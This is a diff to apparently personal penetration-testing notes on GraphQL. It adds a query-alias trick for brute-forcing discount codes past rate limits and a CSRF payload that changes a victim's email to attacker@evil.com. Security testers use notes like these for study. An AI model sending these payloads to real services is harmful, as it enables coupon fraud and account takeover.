@@ -178,4 +178,29 @@ Can be automated with https://github.com/nikitastupin/clairvoyance or Burp scann
 ```
 Also try a `GET` request, or a `POST` request with a content-type of `x-www-form-urlencoded`.
 
-#  Bypassing rate limiting using aliases 
+# Bypassing rate limiting using aliases
+#rate-limiting [[Brute Force]] #auth 
+Aliases allows to make several queries inside one HTTP request.
+It can be used for brute-force. Example:
+```graphql
+query isValidDiscount() {
+	isvalidDiscount(code: 1){
+		valid
+	}
+	isValidDiscount2:isValidDiscount(code: 2){
+		valid
+	}
+	isValidDiscount3:isValidDiscount(code: 3){
+		valid
+	}
+}
+```
+
+# Graphql [[CSRF]]
+Possible if graphql endpoint doesn't validate `Content-Type` and `x-www-form-urlencoded` works.
+Example:
+```
+query=mutation changeEmail($input: ChangeEmailInput!) {changeEmail(input: $input) {email}}&variables={"input":{"email":"attacker@evil.com"}}
+```
+
+
